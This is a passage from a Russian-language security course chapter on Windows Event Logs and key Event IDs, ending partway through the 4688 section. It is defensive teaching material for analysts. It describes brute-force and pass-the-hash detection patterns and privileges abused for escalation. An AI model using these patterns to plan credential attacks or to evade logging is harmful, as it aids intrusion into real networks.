# –ì–ª–∞–≤–∞ 3.1: Windows Event Logs ‚Äî –∫–ª—é—á–µ–≤—ã–µ Event ID

## üéØ –¶–µ–ª–∏ –≥–ª–∞–≤—ã

- –ü–æ–Ω—è—Ç—å —Å—Ç—Ä—É–∫—Ç—É—Ä—É Windows Event Log –∏ —Ä–∞–∑–ª–∏—á–∏—è –º–µ–∂–¥—É –∫–∞–Ω–∞–ª–∞–º–∏ –∂—É—Ä–Ω–∞–ª–æ–≤
- –ù–∞—É—á–∏—Ç—å—Å—è —Ä–∞–±–æ—Ç–∞—Ç—å —Å Event Viewer: —Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏—è, –ø–æ–∏—Å–∫, —ç–∫—Å–ø–æ—Ä—Ç
- –ó–Ω–∞—Ç—å –Ω–∞–∏–∑—É—Å—Ç—å –∫–ª—é—á–µ–≤—ã–µ Event ID –∏ —É–º–µ—Ç—å –∏–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∏—Ä–æ–≤–∞—Ç—å –∏—Ö —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ
- –ü–æ–Ω–∏–º–∞—Ç—å Logon Types –∏ —É–º–µ—Ç—å –æ—Ç–ª–∏—á–∞—Ç—å –∏–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω—ã–π –≤—Ö–æ–¥ –æ—Ç —Å–µ—Ç–µ–≤–æ–≥–æ
- –†–∞—Å–ø–æ–∑–Ω–∞–≤–∞—Ç—å –ø–∞—Ç—Ç–µ—Ä–Ω—ã –∞—Ç–∞–∫ –≤ –∂—É—Ä–Ω–∞–ª–∞—Ö: –±—Ä—É—Ç—Ñ–æ—Ä—Å, lateral movement, —ç—Å–∫–∞–ª–∞—Ü–∏—é –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π

---

## 3.1.1 –°—Ç—Ä—É–∫—Ç—É—Ä–∞ Windows Event Log

Windows –≤–µ–¥—ë—Ç –∂—É—Ä–Ω–∞–ª—ã —Å–æ–±—ã—Ç–∏–π —Å –º–æ–º–µ–Ω—Ç–∞ –ø–æ—è–≤–ª–µ–Ω–∏—è NT-—è–¥—Ä–∞. –ö–∞–∂–¥–æ–µ —Å–æ–±—ã—Ç–∏–µ ‚Äî —ç—Ç–æ —Å—Ç—Ä—É–∫—Ç—É—Ä–∏—Ä–æ–≤–∞–Ω–Ω–∞—è –∑–∞–ø–∏—Å—å —Å —Ñ–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–Ω—ã–º–∏ –ø–æ–ª—è–º–∏. –ñ—É—Ä–Ω–∞–ª—ã —Ö—Ä–∞–Ω—è—Ç—Å—è –≤ —Ñ–∞–π–ª–∞—Ö —Ñ–æ—Ä–º–∞—Ç–∞ `.evtx` –≤ –ø–∞–ø–∫–µ `C:\Windows\System32\winevt\Logs\`.

### –ö–∞–Ω–∞–ª—ã –∂—É—Ä–Ω–∞–ª–æ–≤ (Log Channels)

Windows –æ—Ä–≥–∞–Ω–∏–∑—É–µ—Ç —Å–æ–±—ã—Ç–∏—è –ø–æ –∫–∞–Ω–∞–ª–∞–º. –î–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–∏–∫–∞ –Ω–∞–∏–±–æ–ª–µ–µ –≤–∞–∂–Ω—ã —á–µ—Ç—ã—Ä–µ:

| –ö–∞–Ω–∞–ª | –§–∞–π–ª | –ù–∞–∑–Ω–∞—á–µ–Ω–∏–µ |
|-------|------|------------|
| **Security** | Security.evtx | –ê—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è, –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è, –∞—É–¥–∏—Ç –æ–±—ä–µ–∫—Ç–æ–≤ |
| **System** | System.evtx | –°–æ–±—ã—Ç–∏—è –û–°: —Å—Ç–∞—Ä—Ç/—Å—Ç–æ–ø —Å–µ—Ä–≤–∏—Å–æ–≤, –¥—Ä–∞–π–≤–µ—Ä—ã |
| **Application** | Application.evtx | –°–æ–±—ã—Ç–∏—è –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π |
| **Microsoft-Windows-Sysmon/Operational** | Microsoft-Windows-Sysmon%4Operational.evtx | –†–∞—Å—à–∏—Ä–µ–Ω–Ω—ã–π –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ (Sysmon) |

–ü–æ–º–∏–º–æ –æ—Å–Ω–æ–≤–Ω—ã—Ö –∫–∞–Ω–∞–ª–æ–≤, —Å—É—â–µ—Å—Ç–≤—É—é—Ç —Å–ø–µ—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ:
- `Microsoft-Windows-PowerShell/Operational` ‚Äî —Å–æ–±—ã—Ç–∏—è PowerShell
- `Microsoft-Windows-TaskScheduler/Operational` ‚Äî –ø–ª–∞–Ω–∏—Ä–æ–≤—â–∏–∫ –∑–∞–¥–∞—á
- `Microsoft-Windows-Windows Defender/Operational` ‚Äî Windows Defender
- `Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational` ‚Äî RDP-–ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è

### –°—Ç—Ä—É–∫—Ç—É—Ä–∞ —Å–æ–±—ã—Ç–∏—è

–ö–∞–∂–¥–æ–µ —Å–æ–±—ã—Ç–∏–µ —Å–æ–¥–µ—Ä–∂–∏—Ç:

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{...}"/>
    <EventID>4624</EventID>
    <Version>2</Version>
    <Level>0</Level>           <!-- 0=Information, 2=Error, 3=Warning -->
    <Task>12544</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8020000000000000</Keywords>
    <TimeCreated SystemTime="2025-01-15T10:23:45.123456789Z"/>
    <EventRecordID>123456</EventRecordID>
    <Correlation/>
    <Execution ProcessID="676" ThreadID="700"/>
    <Channel>Security</Channel>
    <Computer>WORKSTATION01.corp.local</Computer>
    <Security/>
  </System>
  <EventData>
    <!-- –î–∞–Ω–Ω—ã–µ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–≥–æ —Å–æ–±—ã—Ç–∏—è -->
    <Data Name="SubjectUserName">john.doe</Data>
    <Data Name="LogonType">3</Data>
    ...
  </EventData>
</Event>
```

–ö–ª—é—á–µ–≤—ã–µ –ø–æ–ª—è –¥–ª—è –∞–Ω–∞–ª–∏–∑–∞:
- **EventID** ‚Äî —Ç–∏–ø —Å–æ–±—ã—Ç–∏—è
- **TimeCreated** ‚Äî –≤—Ä–µ–º—è —Å–æ–±—ã—Ç–∏—è (–≤—Å–µ–≥–¥–∞ –≤ UTC!)
- **Computer** ‚Äî –º–∞—à–∏–Ω–∞, –≥–¥–µ –ø—Ä–æ–∏–∑–æ—à–ª–æ —Å–æ–±—ã—Ç–∏–µ
- **EventData** ‚Äî –¥–∞–Ω–Ω—ã–µ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ–≥–æ —Å–æ–±—ã—Ç–∏—è (—Ä–∞–∑–Ω—ã–µ –¥–ª—è –∫–∞–∂–¥–æ–≥–æ EventID)

### Sysmon ‚Äî —Ä–∞—Å—à–∏—Ä–µ–Ω–Ω—ã–π –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥

Microsoft Sysinternals Sysmon (System Monitor) ‚Äî –±–µ—Å–ø–ª–∞—Ç–Ω—ã–π –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç, –∫–æ—Ç–æ—Ä—ã–π –¥–æ–±–∞–≤–ª—è–µ—Ç –¥–µ—Å—è—Ç–∫–∏ –Ω–æ–≤—ã—Ö Event ID –≤ –æ—Ç–¥–µ–ª—å–Ω—ã–π –∫–∞–Ω–∞–ª. Sysmon –ø–∏—à–µ—Ç —Ç–æ, —á—Ç–æ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–π Windows Audit –Ω–µ –≤–∏–¥–∏—Ç:

- **Event ID 1** ‚Äî —Å–æ–∑–¥–∞–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–∞ (—Å —Ö–µ—à–µ–º –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–≥–æ —Ñ–∞–π–ª–∞)
- **Event ID 3** ‚Äî —Å–µ—Ç–µ–≤–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ
- **Event ID 7** ‚Äî –∑–∞–≥—Ä—É–∑–∫–∞ –º–æ–¥—É–ª—è (DLL)
- **Event ID 10** ‚Äî –¥–æ—Å—Ç—É–ø –∫ –ø—Ä–æ—Ü–µ—Å—Å—É (–∏–Ω—ä–µ–∫—Ü–∏—è)
- **Event ID 11** ‚Äî —Å–æ–∑–¥–∞–Ω–∏–µ —Ñ–∞–π–ª–∞
- **Event ID 13** ‚Äî –∏–∑–º–µ–Ω–µ–Ω–∏–µ —Ä–µ–µ—Å—Ç—Ä–∞
- **Event ID 22** ‚Äî DNS-–∑–∞–ø—Ä–æ—Å

Sysmon —Ç—Ä–µ–±—É–µ—Ç —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –∏ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ (`sysmon.xml`). –ü–æ–ø—É–ª—è—Ä–Ω–∞—è –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è ‚Äî SwiftOnSecurity Sysmon Config.

---

## 3.1.2 Event Viewer ‚Äî —Ä–∞–±–æ—Ç–∞ —Å –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–æ–º

### –ó–∞–ø—É—Å–∫ –∏ –Ω–∞–≤–∏–≥–∞—Ü–∏—è

Event Viewer –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è –Ω–µ—Å–∫–æ–ª—å–∫–∏–º–∏ —Å–ø–æ—Å–æ–±–∞–º–∏:
- `eventvwr.msc` –∏–∑ Run (Win+R)
- –ü—Ä–∞–≤–æ–π –∫–Ω–æ–ø–∫–æ–π –Ω–∞ "Computer" ‚Üí "Manage" ‚Üí "Event Viewer"
- `Start` ‚Üí `Administrative Tools` ‚Üí `Event Viewer`

–î–µ—Ä–µ–≤–æ —Å–ª–µ–≤–∞:
```
Event Viewer (Local)
‚îú‚îÄ‚îÄ Custom Views
‚îÇ   ‚îî‚îÄ‚îÄ Administrative Events
‚îú‚îÄ‚îÄ Windows Logs
‚îÇ   ‚îú‚îÄ‚îÄ Application
‚îÇ   ‚îú‚îÄ‚îÄ Security        ‚Üê –∑–¥–µ—Å—å –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è
‚îÇ   ‚îú‚îÄ‚îÄ Setup
‚îÇ   ‚îú‚îÄ‚îÄ System          ‚Üê –∑–¥–µ—Å—å —Å–µ—Ä–≤–∏—Å—ã
‚îÇ   ‚îî‚îÄ‚îÄ Forwarded Events
‚îî‚îÄ‚îÄ Applications and Services Logs
    ‚îî‚îÄ‚îÄ Microsoft
        ‚îî‚îÄ‚îÄ Windows
            ‚îú‚îÄ‚îÄ PowerShell
            ‚îú‚îÄ‚îÄ Sysmon
            ‚îî‚îÄ‚îÄ ...
```

### –§–∏–ª—å—Ç—Ä–∞—Ü–∏—è —Å–æ–±—ã—Ç–∏–π

–ü—Ä–∞–≤–∞—è –∫–Ω–æ–ø–∫–∞ –Ω–∞ –∂—É—Ä–Ω–∞–ª–µ ‚Üí "Filter Current Log":
- **Logged**: –≤—Ä–µ–º–µ–Ω–Ω–æ–π –¥–∏–∞–ø–∞–∑–æ–Ω (Last hour / Last 12 hours / Last 24 hours / Last 7 days / Custom range)
- **Event level**: Critical, Error, Warning, Information, Verbose
- **Event ID**: –≤–≤–µ–¥–∏—Ç–µ ID —á–µ—Ä–µ–∑ –∑–∞–ø—è—Ç—É—é (–Ω–∞–ø—Ä–∏–º–µ—Ä: `4624, 4625, 4648`)
- **Keywords**: Audit Success / Audit Failure
- **User / Computer**: —Ñ–∏–ª—å—Ç—Ä –ø–æ –∏—Å—Ç–æ—á–Ω–∏–∫—É

XML-—Ñ–∏–ª—å—Ç—Ä (–≤–∫–ª–∞–¥–∫–∞ XML) –ø–æ–∑–≤–æ–ª—è–µ—Ç –ø–∏—Å–∞—Ç—å —Ç–æ—á–Ω—ã–µ –∑–∞–ø—Ä–æ—Å—ã:

```xml
<QueryList>
  <Query Id="0" Path="Security">
    <Select Path="Security">
      *[System[(EventID=4625)
      and TimeCreated[timediff(@SystemTime) &lt;= 86400000]]]
    </Select>
  </Query>
</QueryList>
```

### –≠–∫—Å–ø–æ—Ä—Ç –∂—É—Ä–Ω–∞–ª–æ–≤

- **Save Filtered Log File As** ‚Äî —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç –æ—Ç—Ñ–∏–ª—å—Ç—Ä–æ–≤–∞–Ω–Ω—ã–µ —Å–æ–±—ã—Ç–∏—è –≤ `.evtx`
- **Export Custom View** ‚Äî —ç–∫—Å–ø–æ—Ä—Ç –≤ `.evtx` –∏–ª–∏ `.xml`
- –ß–µ—Ä–µ–∑ PowerShell: `wevtutil epl Security C:\backup\security.evtx`

---

## 3.1.3 –ö–ª—é—á–µ–≤—ã–µ Event ID ‚Äî –ø–æ–ª–Ω—ã–π —Ä–∞–∑–±–æ—Ä

### –ì—Ä—É–ø–ø–∞: –ê—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è –∏ —Å–µ—Å—Å–∏–∏

#### Event ID 4624 ‚Äî Successful Logon (–£—Å–ø–µ—à–Ω—ã–π –≤—Ö–æ–¥)

–°–∞–º–æ–µ –≤–∞–∂–Ω–æ–µ —Å–æ–±—ã—Ç–∏–µ –¥–ª—è –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞. –ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç—Å—è –ø—Ä–∏ –∫–∞–∂–¥–æ–º —É—Å–ø–µ—à–Ω–æ–º –≤—Ö–æ–¥–µ –≤ —Å–∏—Å—Ç–µ–º—É.

**–ö–ª—é—á–µ–≤—ã–µ –ø–æ–ª—è:**
```
SubjectUserName:   SYSTEM (–∫—Ç–æ –∏–Ω–∏—Ü–∏–∏—Ä–æ–≤–∞–ª logon process)
TargetUserName:    john.doe (–∫—Ç–æ –≤–æ—à—ë–ª)
TargetDomainName:  CORP
LogonType:         3
LogonProcessName:  NtLmSsp / Kerberos
AuthenticationPackageName: NTLM / Kerberos
WorkstationName:   ATTACKER-PC
IpAddress:         192.168.1.50
IpPort:            49152
```

**–ü–æ—á–µ–º—É –≤–∞–∂–Ω–æ:** –ö–∞–∂–¥—ã–π —É—Å–ø–µ—à–Ω—ã–π –≤—Ö–æ–¥ –æ—Å—Ç–∞–≤–ª—è–µ—Ç —Å–ª–µ–¥. –ü—Ä–∏ —Ä–∞—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏–∏ –∏–Ω—Ü–∏–¥–µ–Ω—Ç–∞ –≤—ã –∏—â–µ—Ç–µ –∞–Ω–æ–º–∞–ª—å–Ω—ã–µ LogonType, –Ω–µ–æ–±—ã—á–Ω–æ–µ –≤—Ä–µ–º—è, –Ω–µ—Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–µ IP-–∞–¥—Ä–µ—Å–∞.

#### Event ID 4625 ‚Äî Failed Logon (–ù–µ—É–¥–∞—á–Ω—ã–π –≤—Ö–æ–¥)

–ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç—Å—è –ø—Ä–∏ –∫–∞–∂–¥–æ–π –Ω–µ—É–¥–∞—á–Ω–æ–π –ø–æ–ø—ã—Ç–∫–µ –≤—Ö–æ–¥–∞.

**–ö–ª—é—á–µ–≤—ã–µ –ø–æ–ª—è:**
```
TargetUserName:    administrator
TargetDomainName:  CORP
FailureReason:     %%2313 (Unknown user name or bad password)
Status:            0xC000006D
SubStatus:         0xC000006A
LogonType:         3
IpAddress:         10.0.0.5
```

**–ö–æ–¥—ã SubStatus (–ø—Ä–∏—á–∏–Ω–∞ –æ—Ç–∫–∞–∑–∞):**

| SubStatus | –ü—Ä–∏—á–∏–Ω–∞ |
|-----------|---------|
| 0xC000006A | –ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å |
| 0xC0000064 | –ù–µ—Å—É—â–µ—Å—Ç–≤—É—é—â–∏–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å |
| 0xC0000234 | –ê–∫–∫–∞—É–Ω—Ç –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω |
| 0xC0000072 | –ê–∫–∫–∞—É–Ω—Ç –æ—Ç–∫–ª—é—á—ë–Ω |
| 0xC000006F | –í—Ö–æ–¥ –∑–∞ –ø—Ä–µ–¥–µ–ª–∞–º–∏ —Ä–∞–∑—Ä–µ—à—ë–Ω–Ω–æ–≥–æ –≤—Ä–µ–º–µ–Ω–∏ |
| 0xC0000070 | –í—Ö–æ–¥ —Å –Ω–µ—Ä–∞–∑—Ä–µ—à—ë–Ω–Ω–æ–π —Ä–∞–±–æ—á–µ–π —Å—Ç–∞–Ω—Ü–∏–∏ |
| 0xC0000193 | –ò—Å—Ç—ë–∫ —Å—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è –∞–∫–∫–∞—É–Ω—Ç–∞ |
| 0xC0000071 | –ò—Å—Ç—ë–∫ —Å—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è –ø–∞—Ä–æ–ª—è |

**–ü–∞—Ç—Ç–µ—Ä–Ω –±—Ä—É—Ç—Ñ–æ—Ä—Å–∞:** –°–æ—Ç–Ω–∏ —Å–æ–±—ã—Ç–∏–π 4625 –∑–∞ –∫–æ—Ä–æ—Ç–∫–æ–µ –≤—Ä–µ–º—è —Å –æ–¥–Ω–æ–≥–æ IP-–∞–¥—Ä–µ—Å–∞, –ø–µ—Ä–µ–±–∏—Ä–∞—é—â–∏—Ö —Ä–∞–∑–Ω—ã–µ –∏–º–µ–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –∏–ª–∏ –æ–¥–Ω–æ –∏–º—è —Å —Ä–∞–∑–Ω—ã–º–∏ –ø–∞—Ä–æ–ª—è–º–∏.

#### Event ID 4648 ‚Äî Logon using Explicit Credentials (–Ø–≤–Ω—ã–µ —É—á—ë—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ)

–ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç—Å—è, –∫–æ–≥–¥–∞ –ø—Ä–æ—Ü–µ—Å—Å –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –¥—Ä—É–≥–∏–µ —É—á—ë—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ (RunAs, runas.exe, Invoke-Command —Å Credential).

**–ü–æ—á–µ–º—É —ç—Ç–æ –∫—Ä–∏—Ç–∏—á–Ω–æ:** –≠—Ç–æ –æ–¥–∏–Ω –∏–∑ –ø—Ä–∏–∑–Ω–∞–∫–æ–≤ **Pass-the-Hash (PtH)** –∞—Ç–∞–∫–∏. –ü—Ä–∏ PtH –∞—Ç–∞–∫—É—é—â–∏–π –∏—Å–ø–æ–ª—å–∑—É–µ—Ç NTLM-—Ö–µ—à –ø–∞—Ä–æ–ª—è –≤–º–µ—Å—Ç–æ —Å–∞–º–æ–≥–æ –ø–∞—Ä–æ–ª—è. –í –ª–æ–≥–µ –ø–æ—è–≤–ª—è–µ—Ç—Å—è 4648, –≥–¥–µ —É—á—ë—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –≤ –Ω–µ–æ–±—ã—á–Ω–æ–º –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ ‚Äî –Ω–∞–ø—Ä–∏–º–µ—Ä, SYSTEM –∏–ª–∏ —Å–µ—Ç–µ–≤–æ–π —Å–µ—Ä–≤–∏—Å –∑–∞–ø—É—Å–∫–∞–µ—Ç –ø—Ä–æ—Ü–µ—Å—Å –æ—Ç –∏–º–µ–Ω–∏ –æ–±—ã—á–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.

**–ö–ª—é—á–µ–≤—ã–µ –ø–æ–ª—è:**
```
SubjectUserName:   WORKSTATION01$  (–º–∞—à–∏–Ω–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç ‚Äî –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω–æ!)
SubjectLogonId:    0x3E7
TargetUserName:    administrator
TargetDomainName:  CORP
TargetServerName:  DC01
ProcessName:       C:\Windows\System32\cmd.exe
```

**–ü—Ä–∏–∑–Ω–∞–∫ PtH:** `SubjectUserName` –∑–∞–∫–∞–Ω—á–∏–≤–∞–µ—Ç—Å—è –Ω–∞ `$` (–º–∞—à–∏–Ω–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç), –∞ `TargetUserName` ‚Äî –ø—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å. –ò–ª–∏ `SubjectUserName = ANONYMOUS LOGON`.

#### Event ID 4672 ‚Äî Special Privileges Assigned (–ù–∞–∑–Ω–∞—á–µ–Ω–∏–µ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π)

–ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç—Å—è —Å—Ä–∞–∑—É –ø–æ—Å–ª–µ 4624, –∫–æ–≥–¥–∞ –≤–æ—à–µ–¥—à–µ–º—É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é –Ω–∞–∑–Ω–∞—á–µ–Ω—ã –ø—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –ø—Ä–∞–≤–∞.

**–ö–ª—é—á–µ–≤—ã–µ –ø–æ–ª—è:**
```
SubjectUserName:  administrator
PrivilegeList:
  SeSecurityPrivilege
  SeBackupPrivilege
  SeRestorePrivilege
  SeTakeOwnershipPrivilege
  SeDebugPrivilege           ‚Üê –æ–ø–∞—Å–Ω–æ! –ø–æ–∑–≤–æ–ª—è–µ—Ç –∏–Ω—ä–µ–∫—Ü–∏—é –≤ –ø—Ä–æ—Ü–µ—Å—Å—ã
  SeSystemEnvironmentPrivilege
  SeLoadDriverPrivilege
  SeImpersonatePrivilege     ‚Üê —ç–∫—Å–ø–ª—É–∞—Ç–∏—Ä—É–µ—Ç—Å—è –¥–ª—è –ø–æ–≤—ã—à–µ–Ω–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π
  SeEnableDelegationPrivilege
```

**–ß—Ç–æ –º–æ–Ω–∏—Ç–æ—Ä–∏—Ç—å:** –ü–æ—è–≤–ª–µ–Ω–∏–µ 4672 –¥–ª—è –Ω–µ—Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–æ–≤ –∏–ª–∏ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π `SeDebugPrivilege`, `SeImpersonatePrivilege`.

#### Event ID 4740 ‚Äî User Account Locked Out (–ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –∞–∫–∫–∞—É–Ω—Ç–∞)

–ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç—Å—è –Ω–∞ DC, –∫–æ–≥–¥–∞ –∞–∫–∫–∞—É–Ω—Ç –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω –ø–æ—Å–ª–µ –ø—Ä–µ–≤—ã—à–µ–Ω–∏—è –ø–æ—Ä–æ–≥–∞ –Ω–µ—É–¥–∞—á–Ω—ã—Ö –ø–æ–ø—ã—Ç–æ–∫.

```
TargetUserName:    john.doe
TargetDomainName:  CORP
CallerComputerName: WORKSTATION05  ‚Üê —Å –∫–∞–∫–æ–π –º–∞—à–∏–Ω—ã –ø—Ä–∏—à–ª–∏ –Ω–µ—É–¥–∞—á–Ω—ã–µ –ø–æ–ø—ã—Ç–∫–∏
```

**–í–∞–∂–Ω–æ:** 4740 —Å–æ–∑–¥–∞—ë—Ç—Å—è –Ω–∞ Domain Controller. –°–∞–º–æ —Å–æ–±—ã—Ç–∏–µ –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ –Ω–∞ —Ä–∞–±–æ—á–µ–π —Å—Ç–∞–Ω—Ü–∏–∏ ‚Äî 4625 —Å–æ —Å—Ç–∞—Ç—É—Å–æ–º 0xC0000234.

#### Event ID 4776 ‚Äî NTLM Authentication (NTLM-–∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è)

–ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç—Å—è –Ω–∞ DC –ø—Ä–∏ –ø–æ–ø—ã—Ç–∫–µ NTLM-–∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ (—É—Å–ø–µ—à–Ω–æ–π –∏ –Ω–µ—É–¥–∞—á–Ω–æ–π).

```
PackageName:         MICROSOFT_AUTHENTICATION_PACKAGE_V1_0
LogonAccountName:    john.doe
Workstation:         LAPTOP01
Status:              0x0 (—É—Å–ø–µ—Ö) / 0xC000006A (–Ω–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å)
```

**–ü–∞—Ç—Ç–µ—Ä–Ω:** –ú–Ω–æ–∂–µ—Å—Ç–≤–æ 4776 —Å –æ–¥–Ω–æ–π —Ä–∞–±–æ—á–µ–π —Å—Ç–∞–Ω—Ü–∏–∏ –∫ —Ä–∞–∑–Ω—ã–º –∞–∫–∫–∞—É–Ω—Ç–∞–º ‚Äî NTLM –±—Ä—É—Ç—Ñ–æ—Ä—Å.

---

### –ì—Ä—É–ø–ø–∞: –î–æ—Å—Ç—É–ø –∫ –æ–±—ä–µ–∫—Ç–∞–º

#### Event ID 4656 ‚Äî Object Access Attempt (–ü–æ–ø—ã—Ç–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ –æ–±—ä–µ–∫—Ç—É)

–ì–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç—Å—è –ø—Ä–∏ –∑–∞–ø—Ä–æ—Å–µ –¥–æ—Å—Ç—É–ø–∞ –∫ –∞—É–¥–∏—Ä—É–µ–º–æ–º—É –æ–±—ä–µ–∫—Ç—É (—Ñ–∞–π–ª, —Ä–µ–µ—Å—Ç—Ä, –ø—Ä–∏–Ω—Ç–µ—Ä). –¢—Ä–µ–±—É–µ—Ç –≤–∫–ª—é—á–µ–Ω–∏—è –∞—É–¥–∏—Ç–∞ –æ–±—ä–µ–∫—Ç–æ–≤ –∏ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ SACL –Ω–∞ –æ–±—ä–µ–∫—Ç.

```
SubjectUserName:  john.doe
ObjectServer:     Security
ObjectType:       File
ObjectName:       C:\Sensitive\passwords.txt
AccessMask:       0x1 (READ_DATA)
HandleId:         0x64
ProcessName:      C:\Windows\System32\notepad.exe
```

#### Event ID 4663 ‚Äî Object Access Success (–£—Å–ø–µ—à–Ω—ã–π –¥–æ—Å—Ç—É–ø –∫ –æ–±—ä–µ–∫—Ç—É)

–í –æ—Ç–ª–∏—á–∏–µ –æ—Ç 4656, –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞–µ—Ç, —á—Ç–æ –¥–æ—Å—Ç—É–ø –±—ã–ª —Ä–µ–∞–ª—å–Ω–æ –æ—Å—É—â–µ—Å—Ç–≤–ª—ë–Ω. –û–±–∞ —Å–æ–±—ã—Ç–∏—è (4656 + 4663) —Ñ–æ—Ä–º–∏—Ä—É—é—Ç –ø–æ–ª–Ω—É—é –∫–∞—Ä—Ç–∏–Ω—É.

**–°—Ü–µ–Ω–∞—Ä–∏–π –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞:** –£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å SACL –Ω–∞ —Ñ–∞–π–ª —Å –ø–∞—Ä–æ–ª—è–º–∏. –ü—Ä–∏ –ª—é–±–æ–º –¥–æ—Å—Ç—É–ø–µ ‚Äî –Ω–µ–º–µ–¥–ª–µ–Ω–Ω—ã–π –∞–ª–µ—Ä—Ç.

---

### –ì—Ä—É–ø–ø–∞: –ü—Ä–æ—Ü–µ—Å—Å—ã

#### Event ID 4688 ‚Äî New Process Created (–°–æ–∑–¥–∞–Ω–∏–µ –Ω–æ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞)

–û–¥–∏–Ω –∏–∑ —Å–∞–º—ã—Ö —Ü–µ–Ω–Ω—ã—Ö Event ID –¥–ª—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è —É–≥—Ä–æ–∑. –¢—Ä–µ–±—É–µ—Ç –≤–∫–ª—é—á–µ–Ω–∏—è "Audit Process Creation" –≤ –ø–æ–ª–∏—Ç–∏–∫–µ –∞—É–¥–∏—Ç–∞. –î–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏ ‚Äî –≤–∫–ª—é—á–∏—Ç—å "Include command line in process creation events" —á–µ—Ä–µ–∑ GPO.

**–ö–ª—é—á–µ–≤—ã–µ –ø–æ–ª—è:**
```
SubjectUserName:        john.doe
SubjectLogonId:         0x1F4B2A
NewProcessId:           0x1234
NewProcessName:         C:\Windows\System32\cmd.exe
